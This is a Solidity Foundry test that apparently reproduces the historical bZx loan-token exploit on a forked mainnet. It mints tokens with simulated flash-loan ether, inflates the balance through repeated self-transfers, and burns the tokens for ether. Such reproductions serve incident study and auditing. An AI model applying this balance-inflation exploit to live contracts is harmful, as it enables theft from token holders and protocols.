// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 
// Attacker : https://etherscan.io/address/0xd1c0f1316140D6bF1a9e2Eea8a227dAD151F69b7
// Vulnerable Contract : https://etherscan.io/address/0xb983e01458529665007ff7e0cddecdb74b967eb6
// Attack Tx : https://etherscan.io/tx/0x85dc2a433fd9eaadaf56fd8156c956da23fc17e5ef83955c7e2c4c37efa20bb5

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xde744d544a9d768e96c21b5f087fc54b776e9b25#code

// @Analysis
// Twitter Guy : https://x.com/0xCommodity/status/1305354469354303488

pragma solidity ^0.8.0;

contract bzx is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 10_852_716 - 1;

    ILoanTokenLogicWeth constant loanToken = ILoanTokenLogicWeth(0xB983E01458529665007fF7E0CDdeCDB74B967Eb6);
    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(0x0);
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        vm.deal(address(this), 200 ether); //simulation flashloan
        loanToken.mintWithEther{value: 200 ether}(address(this));

        // transfer token to myself repeatedly
        for(int i = 0; i < 4; i++){
            uint256 balance = loanToken.balanceOf(address(this));
            loanToken.transfer(address(this), balance);
        }

        uint256 balance = loanToken.balanceOf(address(this));
        loanToken.burnToEther(address(this), balance);

        payable(address(0x0)).transfer(200 ether); //simulation replay flashloan
    }

    fallback() external payable {}
}
